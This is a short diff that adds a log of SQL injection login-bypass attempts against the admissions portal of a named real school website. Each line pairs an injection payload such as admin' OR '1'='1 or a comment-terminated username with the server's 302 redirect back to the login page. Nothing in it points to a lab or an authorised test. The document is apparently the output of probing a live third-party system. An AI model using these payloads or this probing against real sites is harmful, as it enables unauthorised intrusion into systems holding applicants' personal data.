@@ -1,0 +1,7 @@
+[admin'-- - | x] -> 302|https://spmb.sman1cigombong.sch.id/index.php?url=auth
+[admin' OR '1'='1 | x] -> 302|https://spmb.sman1cigombong.sch.id/index.php?url=auth
+[admin" OR "1"="1 | x] -> 302|https://spmb.sman1cigombong.sch.id/index.php?url=auth
+[admin'/* | x*/] -> 302|https://spmb.sman1cigombong.sch.id/index.php?url=auth
+[admin | ' OR '1'='1] -> 302|https://spmb.sman1cigombong.sch.id/index.php?url=auth
+[admin' AND 1=1-- - | x] -> 302|https://spmb.sman1cigombong.sch.id/index.php?url=auth
+== body terakhir ==
